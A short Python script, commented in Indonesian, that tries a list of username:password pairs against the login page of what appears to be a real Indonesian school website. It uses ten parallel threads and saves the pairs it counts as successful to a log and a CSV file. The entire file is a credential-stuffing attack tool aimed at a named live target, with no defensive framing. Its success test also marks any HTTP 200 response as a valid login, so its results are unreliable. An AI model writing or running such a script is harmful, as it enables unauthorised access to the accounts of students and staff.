import requests
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
import logging
import os

# ========================
# Konfigurasi
# ========================
url = "https://sman6psp.sch.id/login"  # Ubah sesuai target
threads = 10
timeout = 10

input_file = "/Users/mac/valid_creds.txt"
success_log = "/Users/mac/check.log"
csv_output = "/Users/mac/valid_only.csv"

# Buat log file
logging.basicConfig(filename=success_log, level=logging.INFO, format='%(message)s')

# Header CSV
with open(csv_output, "w") as f:
    f.write("USERNAME,PASSWORD\n")

# Fungsi cek login
def check_login(cred):
    cred = cred.strip()
    if not cred:
        return False

    parts = cred.split(":")
    if len(parts) == 2:
        username, password = parts
    else:
        username, password = "UNKNOWN", parts[0]

    # Data POST sesuai form
    data = {
        "username": username,
        "password": password
    }

    try:
        r = requests.post(url, data=data, timeout=timeout)
        # Kriteria sukses (sesuaikan)
        if "dashboard" in r.text.lower() or r.status_code == 200:
            result = f"[SUCCESS] {username}:{password}"
            print(result)
            logging.info(result)

            # Simpan ke CSV
            with open(csv_output, "a") as f:
                f.write(f"{username},{password}\n")
            return True
    except Exception as e:
        pass
    return False

# Jalankan
with open(input_file, "r") as f:
    creds = f.readlines()

print(f"Mulai testing {len(creds)} credentials...\n")
with ThreadPoolExecutor(max_workers=threads) as executor:
    list(tqdm(executor.map(check_login, creds), total=len(creds)))

print("\n✅ Proses selesai!")
print(f"Hasil sukses tersimpan di: {success_log}")
print(f"File CSV: {csv_output}")

